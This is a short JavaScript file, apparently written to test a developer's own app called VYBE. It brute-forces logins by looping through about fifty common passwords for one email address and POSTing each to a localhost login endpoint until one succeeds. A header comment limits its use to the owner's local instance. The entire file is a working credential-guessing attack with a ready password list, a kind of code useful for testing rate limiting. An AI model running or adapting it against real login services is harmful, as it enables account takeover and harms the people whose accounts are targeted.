// A brute-force script: try many passwords for one email, as fast as possible.
// Only ever run this against your own local VYBE.

const target = "aman@gmail.com";

const passwords = [
  "123456",
  "admin",
  "12345678",
  "123456789",
  "12345",
  "password",
  "Aa123456",
  "Pass@123",
  "admin123",
  "1234567",
  "123123",
  "111111",
  "12345678910",
  "P@ssw0rd",
  "Password",
  "Aa@123456",
  "admintelecom",
  "Admin@123",
  "112233",
  "qwerty",
  "qwerty123",
  "qwerty1",
  "1234",
  "abc123",
  "password1",
  "000000",
  "iloveyou",
  "1111111",
  "11111111",
  "secret",
  "dragon",
  "monkey",
  "letmein",
  "football",
  "baseball",
  "sunshine",
  "1q2w3e4r5t",
  "qwertyuiop",
  "123",
  "1qaz2wsx",
  "passw0rd",
  "welcome",
  "shadow",
  "master",
  "superman",
  "654321",
  "7777777",
  "121212",
  "888888",
   "1234567890"
]

const attack = async () => {
    const start = Date.now();
    for (const password of passwords) {
        const res = await fetch("http://localhost:3000/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: target, password }),
        });

        console.log(res.status, password);
         if (res.status === 200) {
            console.log(`Found the password in ${Date.now() - start} ms: ${password}`);
            return;
        }
    }
    console.log("Password not found");
};

attack();